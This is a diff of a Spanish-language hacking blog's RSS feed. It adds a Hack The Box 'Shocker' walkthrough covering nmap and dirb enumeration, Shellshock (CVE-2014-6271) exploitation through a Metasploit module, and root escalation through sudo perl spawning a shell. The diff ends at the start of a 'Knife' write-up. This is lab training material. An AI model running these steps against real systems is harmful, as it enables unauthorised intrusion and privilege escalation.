@@ -1,4 +1,113 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne - Hacking Blog</title><description>No description</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Knife HTB Writeup</title><link>https://fuwari.vercel.app/posts/knife/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/knife/</guid><description>Es una Maquina easy en la cual explotamos un php-dev Vulnerable y escalamos Privilegios abusando del Binario knife como permisos SUDO.</description><pubDate>Fri, 30 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Fullaw4ke - Hacking Blog</title><description>No description</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Shocker HTB Writeup</title><link>https://fuwari.vercel.app/posts/shocker/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/shocker/</guid><description>Maquina en la cual abusamos del CVE-2014-6271 - Shellshock, luego Binario Perl con Permisos SUDO.</description><pubDate>Fri, 30 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
+&lt;p&gt;Primero nuestro escaneo de nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open -n --min-rate 4000 -Pn 10.10.10.56 
+
+[sudo] password for mil4ne: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 12:25 EDT
+Nmap scan report for 10.10.10.56
+Host is up (0.14s latency).
+Not shown: 65465 closed tcp ports (reset), 68 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Escaneo de versiones:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p80,2222 -sCV 10.10.10.56
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 12:25 EDT
+Nmap scan report for 10.10.10.56 (10.10.10.56)
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&apos;t have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;Enumeration&lt;/h1&gt;
+&lt;h2&gt;Web - Port 80&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;image-1.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Esta web no tiene botones ni nada interesante, asi que intentamos hacer fuzzing:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; dirb http://10.10.10.56/  
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Aug 30 12:26:44 2024
+URL_BASE: http://10.10.10.56/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.56/ ----
++ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                                                                                                                                        
++ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Lo unico que podemos encontrar es el &lt;code&gt;cgi-bin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;al ver la version de apache tenemos algo interesante que probar:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;whatweb http://10.10.10.56/  
+http://10.10.10.56/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tambien Basandonos en el nombre de la maquina &lt;code&gt;Shocker&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;Shellshock Attack – Pentesting Web&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Shellshock es una vulnerabilidad asociada al &lt;code&gt;CVE-2014-6271&lt;/code&gt; que salió el 24 de septiembre de 2014 y afecta a la shell de Linux &lt;code&gt;Bash&lt;/code&gt; hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Bueno te dejo algunos recursos que te podrian servir:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock&lt;/li&gt;
+&lt;li&gt;https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability&lt;/li&gt;
+&lt;li&gt;https://deephacking.tech/shellshock-attack-pentesting-web/&lt;/li&gt;
+&lt;li&gt;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;En este Writeup lo explotaremos con Metasploit, pero igual es muy facil explotarlo de forma manual con Burpsuite o utilizando &lt;code&gt;curl&lt;/code&gt; para modificar el &lt;code&gt;User-Agent&lt;/code&gt;.&lt;/p&gt;
+&lt;h1&gt;Explotation&lt;/h1&gt;
+&lt;p&gt;Vas a usar este modulo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfconsole
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use multi/http/apache_mod_cgi_bash_env_exec 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set targeturi /cgi-bin/user.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set rhosts 10.10.10.56
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;set lhost tun0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;run
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;La terminal nos sale &apos;vacia&apos; por asi decirlo (No esta Full TTY), asi que la arreglamos con este comando:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;En este caso solo haremos el primer comando, ya que no es necesario hacer toda la tty.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;shelly@Shocker:~$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;TREMENDO, el binario de perl con permisos SUDO.&lt;/p&gt;
+&lt;p&gt;https://gtfobins.github.io/gtfobins/perl/#sudo&lt;/p&gt;
+&lt;p&gt;de una, encontramos como explotarlo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo perl -e &apos;exec &quot;/bin/sh&quot;;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y listo ya tenemos una shell como root.&lt;/p&gt;
+</content:encoded></item><item><title>Knife HTB Writeup</title><link>https://fuwari.vercel.app/posts/knife/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/knife/</guid><description>Es una Maquina easy en la cual explotamos un php-dev Vulnerable y escalamos Privilegios abusando del Binario knife como permisos SUDO.</description><pubDate>Thu, 29 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
 &lt;p&gt;Primero nuestro escaneo de nmap:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open -n --min-rate 4000 -Pn 10.10.10.242 
 
